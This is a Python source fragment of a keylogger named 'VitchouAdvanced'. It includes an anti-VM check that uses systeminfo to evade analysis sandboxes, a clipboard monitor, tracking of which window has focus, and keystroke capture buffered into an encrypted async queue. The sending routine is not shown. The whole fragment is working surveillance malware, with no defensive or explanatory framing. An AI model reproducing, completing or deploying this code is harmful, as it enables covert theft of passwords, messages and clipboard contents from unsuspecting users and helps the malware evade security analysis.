class SecurityManager:
    """Handles stealth and analysis environment detection."""
    @staticmethod
    def is_safe_environment() -> bool:
        if not CONFIG["ANTI_VM"]: return True
        try:
            indicators = ["virtualbox", "vmware", "hyper-v", "qemu"]
            # Fetch system info to detect hypervisors
            output = subprocess.check_output("systeminfo", shell=True).decode().lower()
            return not any(vm in output for vm in indicators)
        except Exception:
            # If check fails, assume safe to avoid crashing
            return True

class VitchouAdvanced:
    def __init__(self):
        self.fernet = Fernet(CONFIG["MASTER_KEY"].encode())
        self.log_buffer = []
        self.active_window = ""
        self.queue = asyncio.Queue()

    def _get_context(self) -> str:
        """Identify the application currently focused by the user."""
        try:
            win = gw.getActiveWindow()
            return win.title if win else "Desktop"
        except Exception:
            return "System"

    async def clipboard_monitor(self):
        """Asynchronously monitor clipboard for text changes."""
        last_clip = ""
        while True:
            current_clip = pyperclip.paste()
            if current_clip != last_clip:
                last_clip = current_clip
                await self.queue.put(f"\n[CLIPBOARD] {current_clip}\n")
            await asyncio.sleep(5)

    def on_press(self, key):
        """Capture keystrokes and handle window context switching."""
        ctx = self._get_context()
        if ctx != self.active_window:
            self.active_window = ctx
            timestamp = datetime.now().strftime('%H:%M')
            self.log_buffer.append(f"\n[{timestamp}] Focus: {ctx}\n")

        try:
            val = key.char
        except AttributeError:
            val = f"<{key}>"
        
        self.log_buffer.append(val)

        # If buffer threshold is met, move data to the async queue
        if len(self.log_buffer) >= CONFIG["BUFFER_THRESHOLD"]:
            full_log = "".join(self.log_buffer)
            asyncio.run_coroutine_threadsafe(self.queue.put(full_log), asyncio.get_event_loop())
            self.log_buffer = []

